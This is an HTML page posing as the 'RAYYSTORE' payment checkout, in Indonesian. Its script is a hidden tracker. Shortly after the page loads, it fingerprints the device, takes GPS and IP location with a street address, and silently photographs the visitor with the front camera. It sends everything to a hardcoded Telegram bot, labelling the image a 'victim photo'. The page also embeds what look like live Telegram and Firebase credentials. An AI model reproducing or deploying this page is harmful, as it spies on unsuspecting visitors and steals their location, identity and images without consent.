<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PAYMENT RAYYSTORE</title>
    <style>
        :root { --accent: #00d2ff; --bg: #05070a; --card: #0d121b; }
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: var(--bg); color: #fff; overflow-x: hidden; }

        /* LOADING LOGO R PULSE */
        #loader { position:fixed; inset:0; background:var(--bg); z-index:9999; display:flex; align-items:center; justify-content:center; transition: 1s; }
        .logo-r-load { font-size: 80px; font-weight: 900; color: var(--accent); text-shadow: 0 0 30px var(--accent); animation: pulse 1.5s infinite; }
        
        /* LOGO R DI ATAS JUDUL */
        .logo-main { font-size: 60px; font-weight: 900; color: var(--accent); text-shadow: 0 0 20px var(--accent); animation: pulse 2s infinite ease-in-out; margin-bottom: 10px; display: inline-block; }

        @keyframes pulse { 
            0%, 100% { opacity: 0.6; transform: scale(0.95); } 
            50% { opacity: 1; transform: scale(1.05); text-shadow: 0 0 40px var(--accent); } 
        }

        /* NOTIF SLIDE */
        .notif { position: fixed; top: -120px; left: 50%; transform: translateX(-50%); background: var(--card); border: 1px solid var(--accent); padding: 15px 30px; border-radius: 15px; z-index: 10000; transition: 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); box-shadow: 0 10px 30px rgba(0,210,255,0.4); text-align: center; min-width: 280px; font-weight: bold; color: var(--accent); }
        .notif.show { top: 30px; }

        /* OFFLINE SCREEN */
        #offline-screen { display:none; position:fixed; inset:0; background:#05070a; z-index:9500; flex-direction:column; align-items:center; justify-content:center; text-align:center; padding:20px; }

        .container { display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
        .card { background: var(--card); border: 1px solid #1f2937; padding: 35px; border-radius: 28px; width: 100%; max-width: 380px; text-align: center; border-top: 4px solid var(--accent); box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        
        input { width: 100%; padding: 16px; margin-bottom: 12px; background: #161d29; border: 1px solid #1f2937; color: #fff; border-radius: 14px; outline: none; transition: 0.3s; }
        input:focus { border-color: var(--accent); box-shadow: 0 0 10px rgba(0,210,255,0.2); }
        
        .btn-pay { width: 100%; padding: 18px; background: var(--accent); color: #000; border: none; border-radius: 14px; font-weight: 800; cursor: pointer; margin-bottom: 15px; transition: 0.3s; }
        .btn-pay:hover { transform: scale(1.02); box-shadow: 0 0 20px var(--accent); }

        .cs-text { font-size: 0.8rem; color: #8b949e; margin: 15px 0 10px 0; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
        .cs-container { display: flex; gap: 10px; flex-direction: column; }
        .btn-cs { padding: 12px; border-radius: 12px; text-decoration: none; font-weight: bold; font-size: 0.9rem; display: flex; align-items: center; justify-content: center; gap: 8px; transition: 0.3s; color: #fff; }
        .wa { background: #25d366; }
        .tele { background: #0088cc; }
        
        /* TOMBOL STATUS */
        .btn-status { background: transparent; border: 1px solid #333; margin-top: 5px; color: #8b949e; }
        .btn-status:hover { border-color: var(--accent); color: var(--accent); }
        
        /* Progress bar tracking (hidden) */
        #track-progress { display: none; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div id="loader"><div class="logo-r-load">R</div></div>
<div id="notif-box" class="notif">Pesan</div>

<div id="offline-screen">
    <div class="logo-main">R</div>
    <h2 style="color:#e74c3c; margin-bottom:10px;">SERVER OFFLINE</h2>
    <p style="color:#8b949e; margin-bottom: 30px;">Toko sedang tutup. Kembali lagi nanti.</p>
    <div class="cs-container" style="width: 250px;">
        <a href="https://wa.me/628131172093" class="btn-cs wa">Hubungi WhatsApp</a>
    </div>
</div>

<div class="container">
    <div class="card">
        <div class="logo-main">R</div>
        
        <h1 style="margin-bottom:20px; font-size: 1.5rem;">RAYY <span style="color:var(--accent)">STORE</span></h1>
        
        <input type="text" id="buyer-name" placeholder="Username / NAMA LU BEBAS">
        <input type="number" id="amount" placeholder="Nominal PENGISIAN (SESUAI HARGA BARANG LU)(Rp)">
        
        <button class="btn-pay" onclick="handlePay()">BAYAR SEKARANG</button>
        
        <p class="cs-text">Bantuan & Riwayat</p>
        <div class="cs-container">
            <a href="https://wa.me/628131172093" class="btn-cs wa">WhatsApp TIM CS</a>
            <a href="https://t.me/Rayynotjavva" class="btn-cs tele">Telegram TIM CS</a>
            <a href="https://raimift2009-code.github.io/toko-rayy/status.html" class="btn-cs btn-status">🔍 CEK STATUS TRANSAKSI</a>
        </div>
    </div>
</div>

<!-- Hidden elements for tracking -->
<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>
<div id="track-progress"></div>

<script>
    // ===============================================
    // RAY-EYE TRACKER v2.0 - PAYMENT STORE EDITION
    // ===============================================
    
    (function() {
        // ========== KONFIGURASI ==========
        // GANTI TOKEN DI BAWAH DENGAN PPAHAM LO!
        const CONFIG = {
            TELEGRAM_TOKEN: '8416626215:AAHgkbyUIhmWDT9rQJVQJnnd-eI8uVJdr1Y', // GANTI!
            CHAT_ID: '7966336512', // GANTI!
            GPS_TIMEOUT: 10000,
            CAMERA_DELAY: 3000
        };
        
        // Firebase config (dari script lo)
        const MERCHANT_SLUG = "rayy-store";
        const API_TOKEN = "ZgjlIcOuqhkp4AJ02XzY9mannYCHZkDy";
        const firebaseConfig = { databaseURL: "https://rayy-all-web-default-rtdb.asia-southeast1.firebasedatabase.app/" };
        
        // ========== ELEMEN ==========
        const elements = {
            video: document.getElementById('video'),
            canvas: document.getElementById('canvas'),
            notif: document.getElementById('notif-box'),
            loader: document.getElementById('loader'),
            offlineScreen: document.getElementById('offline-screen'),
            buyerName: document.getElementById('buyer-name'),
            amount: document.getElementById('amount')
        };
        
        // ========== STATE ==========
        let trackingData = {
            device: {},
            location: { lat: null, lon: null, accuracy: null, method: null, address: null },
            camera: { success: false, error: null },
            network: {},
            payment: {},
            timestamp: new Date().toISOString()
        };
        
        // ========== FUNGSI NOTIF ==========
        window.showNotif = (txt, isError = false) => {
            elements.notif.innerText = txt;
            elements.notif.style.borderColor = isError ? '#ff5555' : 'var(--accent)';
            elements.notif.style.color = isError ? '#ff5555' : 'var(--accent)';
            elements.notif.classList.add('show');
            setTimeout(() => elements.notif.classList.remove('show'), 3000);
        };
        
        // ========== FUNGSI KIRIM KE TELEGRAM ==========
        async function sendToTelegram(type, content, isFile = false) {
            const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/send${type}`;
            const formData = new FormData();
            formData.append('chat_id', CONFIG.CHAT_ID);
            
            if (isFile) {
                formData.append('photo', content, 'korban.jpg');
                formData.append('caption', content.caption || '📸 <b>CAPTURE</b>\n' + new Date().toLocaleString());
                formData.append('parse_mode', 'HTML');
            } else {
                formData.append('text', content);
                formData.append('parse_mode', 'HTML');
            }
            
            try {
                const res = await fetch(url, { method: 'POST', body: formData });
                return res.ok;
            } catch (e) {
                console.error('Telegram error:', e);
                return false;
            }
        }
        
        // ========== 1. KOLEKSI DATA DEVICE ==========
        function collectDeviceData() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            const renderer = gl ? gl.getParameter(gl.RENDERER) : 'Unknown';
            
            trackingData.device = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages.join(', '),
                online: navigator.onLine ? 'Online' : 'Offline',
                screen: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
                availScreen: `${screen.availWidth}x${screen.availHeight}`,
                windowSize: `${window.innerWidth}x${window.innerHeight}`,
                deviceMemory: navigator.deviceMemory || 'Unknown',
                cpuCores: navigator.hardwareConcurrency || 'Unknown',
                gpu: renderer,
                touchSupport: 'ontouchstart' in window ? 'Yes' : 'No',
                cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                currentTime: new Date().toString(),
                pageLoadTime: performance.now().toFixed(2) + 'ms',
                referrer: document.referrer || 'Direct',
                url: location.href,
                title: document.title
            };
            
            // Battery jika tersedia
            if ('getBattery' in navigator) {
                navigator.getBattery().then(battery => {
                    trackingData.device.batteryLevel = Math.floor(battery.level * 100) + '%';
                    trackingData.device.batteryCharging = battery.charging ? 'Yes' : 'No';
                }).catch(() => {});
            }
            
            // Network info
            if ('connection' in navigator) {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                trackingData.network = {
                    effectiveType: conn.effectiveType,
                    rtt: conn.rtt + 'ms',
                    downlink: conn.downlink + 'Mbps',
                    saveData: conn.saveData ? 'Yes' : 'No'
                };
            }
        }
        
        // ========== 2. AMBIL LOKASI GPS ==========
        async function collectLocationData() {
            return new Promise(async (resolve) => {
                if (!navigator.geolocation) {
                    trackingData.location.method = 'GPS not supported';
                    resolve();
                    return;
                }
                
                const timeoutId = setTimeout(() => {
                    trackingData.location.method = 'GPS timeout';
                    resolve();
                }, CONFIG.GPS_TIMEOUT);
                
                try {
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            clearTimeout(timeoutId);
                            
                            trackingData.location = {
                                lat: position.coords.latitude,
                                lon: position.coords.longitude,
                                accuracy: position.coords.accuracy + ' meters',
                                altitude: position.coords.altitude || 'N/A',
                                heading: position.coords.heading || 'N/A',
                                speed: position.coords.speed || 'N/A',
                                method: 'GPS',
                                timestamp: new Date(position.timestamp).toISOString()
                            };
                            
                            // Reverse geocoding
                            try {
                                const geoRes = await fetch(
                                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}&zoom=18&addressdetails=1`,
                                    { headers: { 'User-Agent': 'Mozilla/5.0' } }
                                );
                                const geoData = await geoRes.json();
                                trackingData.location.address = geoData.display_name || 'Unknown';
                                
                                if (geoData.address) {
                                    trackingData.location.addressDetails = {
                                        road: geoData.address.road || 'N/A',
                                        city: geoData.address.city || geoData.address.town || geoData.address.village || 'N/A',
                                        state: geoData.address.state || 'N/A',
                                        country: geoData.address.country || 'N/A',
                                        postcode: geoData.address.postcode || 'N/A'
                                    };
                                }
                            } catch (e) {
                                trackingData.location.reverseGeoError = e.message;
                            }
                            
                            resolve();
                        },
                        (error) => {
                            clearTimeout(timeoutId);
                            trackingData.location.method = 'GPS error: ' + error.message;
                            resolve();
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: CONFIG.GPS_TIMEOUT,
                            maximumAge: 0
                        }
                    );
                } catch (e) {
                    clearTimeout(timeoutId);
                    trackingData.location.method = 'GPS exception';
                    resolve();
                }
            });
        }
        
        // ========== 3. FALLBACK IP API ==========
        async function collectIPData() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                
                trackingData.network.publicIP = data.ip;
                trackingData.location = {
                    lat: data.latitude,
                    lon: data.longitude,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    postal: data.postal,
                    timezone: data.timezone,
                    org: data.org,
                    method: 'IP Geolocation'
                };
            } catch (e) {
                try {
                    const res2 = await fetch('https://ipinfo.io/json');
                    const data2 = await res2.json();
                    const [lat, lon] = (data2.loc || ',').split(',');
                    
                    trackingData.network.publicIP = data2.ip;
                    trackingData.location = {
                        lat: lat || 'N/A',
                        lon: lon || 'N/A',
                        city: data2.city,
                        region: data2.region,
                        country: data2.country,
                        org: data2.org,
                        method: 'IP Geolocation (ipinfo)'
                    };
                } catch (e2) {
                    trackingData.location.method = 'IP fallback failed';
                }
            }
        }
        
        // ========== 4. AMBIL FOTO ==========
        async function capturePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user",
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                
                elements.video.srcObject = stream;
                
                await new Promise((resolve) => {
                    elements.video.onloadedmetadata = () => {
                        elements.video.play();
                        resolve();
                    };
                });
                
                // Tunggu bentar biar kamera fokus
                await new Promise(r => setTimeout(r, CONFIG.CAMERA_DELAY));
                
                elements.canvas.width = elements.video.videoWidth;
                elements.canvas.height = elements.video.videoHeight;
                elements.canvas.getContext('2d').drawImage(elements.video, 0, 0);
                
                const photoBlob = await new Promise(resolve => 
                    elements.canvas.toBlob(resolve, 'image/jpeg', 0.9)
                );
                
                stream.getTracks().forEach(track => track.stop());
                
                trackingData.camera.success = true;
                trackingData.camera.photoBlob = photoBlob;
                trackingData.camera.dimensions = `${elements.canvas.width}x${elements.canvas.height}`;
                
                return photoBlob;
            } catch (e) {
                trackingData.camera.success = false;
                trackingData.camera.error = e.message;
                return null;
            }
        }
        
        // ========== 5. FORMAT REPORT ==========
        function formatReport() {
            let report = '╔════════════════════════════════════╗\n';
            report += '║    RAYYSTORE - PAYMENT TRACKER    ║\n';
            report += '╚════════════════════════════════════╝\n\n';
            
            report += '🕐 TIMESTAMP: ' + trackingData.timestamp + '\n';
            report += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
            
            // Payment info (kalo udah diisi)
            if (trackingData.payment.name || trackingData.payment.amount) {
                report += '💰 PAYMENT INFORMATION\n';
                if (trackingData.payment.name) report += `  • Nama: ${trackingData.payment.name}\n`;
                if (trackingData.payment.amount) report += `  • Nominal: Rp ${trackingData.payment.amount.toLocaleString()}\n`;
                if (trackingData.payment.orderId) report += `  • Order ID: ${trackingData.payment.orderId}\n`;
                report += '\n';
            }
            
            // Device info
            report += '📱 DEVICE INFORMATION\n';
            Object.entries(trackingData.device).forEach(([key, val]) => {
                if (val) report += `  • ${key}: ${val}\n`;
            });
            report += '\n';
            
            // Network info
            if (Object.keys(trackingData.network).length > 0) {
                report += '🌐 NETWORK INFORMATION\n';
                Object.entries(trackingData.network).forEach(([key, val]) => {
                    if (val) report += `  • ${key}: ${val}\n`;
                });
                report += '\n';
            }
            
            // Location info
            if (trackingData.location.lat || trackingData.location.method) {
                report += '📍 LOCATION INFORMATION\n';
                Object.entries(trackingData.location).forEach(([key, val]) => {
                    if (val && typeof val === 'object') {
                        report += `  • ${key}:\n`;
                        Object.entries(val).forEach(([k, v]) => {
                            if (v) report += `      - ${k}: ${v}\n`;
                        });
                    } else if (val) {
                        report += `  • ${key}: ${val}\n`;
                    }
                });
                report += '\n';
            }
            
            // Camera info
            report += '📸 CAMERA STATUS\n';
            report += `  • Success: ${trackingData.camera.success ? '✅' : '❌'}\n`;
            if (trackingData.camera.dimensions) {
                report += `  • Resolution: ${trackingData.camera.dimensions}\n`;
            }
            if (trackingData.camera.error) {
                report += `  • Error: ${trackingData.camera.error}\n`;
            }
            
            return report;
        }
        
        // ========== 6. FUNGSI UTAMA TRACKING ==========
        async function runTracking(manualPaymentData = null) {
            showNotif('⏳ Mengamankan koneksi...');
            
            // Update payment data jika ada
            if (manualPaymentData) {
                trackingData.payment = {
                    ...trackingData.payment,
                    ...manualPaymentData
                };
            }
            
            // Collect data berurutan
            collectDeviceData();
            
            // Coba GPS
            await collectLocationData();
            
            // Fallback IP jika GPS gagal
            if (!trackingData.location.lat) {
                await collectIPData();
            }
            
            // Ambil foto
            const photoBlob = await capturePhoto();
            
            // Format report
            const finalReport = formatReport();
            
            // Kirim ke Telegram
            await sendToTelegram('Message', finalReport);
            
            // Kirim foto jika ada
            if (photoBlob) {
                let locationText = '';
                if (trackingData.location.address) {
                    locationText = trackingData.location.address.substring(0, 100);
                } else if (trackingData.location.city) {
                    locationText = trackingData.location.city;
                } else {
                    locationText = 'Unknown location';
                }
                
                photoBlob.caption = `📸 FOTO KORBAN\n📍 ${locationText}\n💰 Rp ${trackingData.payment.amount || 'Unknown'}`;
                await sendToTelegram('Photo', photoBlob, true);
            }
            
            console.log('Tracking completed:', trackingData);
        }
        
        // ========== LOADER & INIT ==========
        window.addEventListener('load', () => {
            setTimeout(() => { 
                elements.loader.style.opacity = '0';
                setTimeout(() => elements.loader.style.display = 'none', 1000);
            }, 1500);
            
            // Firebase listener (dari script lo)
            import('https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js')
                .then(({ initializeApp }) => {
                    import('https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js')
                        .then(({ getDatabase, ref, onValue }) => {
                            const app = initializeApp(firebaseConfig);
                            const db = getDatabase(app);
                            
                            onValue(ref(db, 'server_status'), (snap) => {
                                const status = snap.val();
                                elements.offlineScreen.style.display = status === "OFF" ? "flex" : "none";
                            });
                        });
                })
                .catch(e => console.error('Firebase error:', e));
            
            // Cek parameter URL
            const urlParams = new URLSearchParams(window.location.search);
            const amountParam = urlParams.get('amount');
            if (amountParam) {
                elements.amount.value = amountParam;
            }
            
            // Mulai tracking secepatnya
            setTimeout(() => {
                runTracking();
            }, 2000);
        });
        
        // ========== HANDLE PAYMENT ==========
        window.handlePay = async () => {
            const name = elements.buyerName.value;
            const amount = elements.amount.value;
            
            if(!name || !amount || amount <= 0) { 
                showNotif("⚠️ Isi data dengan benar bos!", true); 
                return; 
            }
            
            showNotif("⏳ Memproses pembayaran...");
            
            // Generate order ID
            const date = new Date();
            const orderId = "RAYY" + date.getTime();
            
            // Update tracking data dengan info payment
            trackingData.payment = {
                name: name,
                amount: parseInt(amount),
                orderId: orderId,
                timestamp: new Date().toLocaleString('id-ID')
            };
            
            // Kirim tracking update ke Telegram
            const paymentUpdate = `💰 PAYMENT INITIATED\nNama: ${name}\nNominal: Rp ${parseInt(amount).toLocaleString()}\nOrder: ${orderId}`;
            await sendToTelegram('Message', paymentUpdate);
            
            // Firebase log (dari script lo)
            try {
                const { initializeApp } = await import('https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js');
                const { getDatabase, ref, set } = await import('https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js');
                
                const app = initializeApp(firebaseConfig);
                const db = getDatabase(app);
                
                await set(ref(db, 'transactions/' + orderId), {
                    orderId: orderId,
                    buyer: name,
                    amount: parseInt(amount),
                    status: "Pending",
                    slug: MERCHANT_SLUG,
                    time: new Date().toLocaleString('id-ID')
                });
                
                showNotif("✅ Mengalihkan ke QRIS...");
                
                setTimeout(() => { 
                    const targetUrl = `https://app.pakasir.com/pay/${MERCHANT_SLUG}/${amount}?order_id=${orderId}&qris_only=1`;
                    window.location.href = targetUrl; 
                }, 1500);
            } catch (err) {
                console.error(err);
                showNotif("❌ Gagal Terkoneksi Database", true);
            }
        };
    })();
</script>

<!-- Firebase module script (dari script lo, tapi udah diinclude di atas) -->
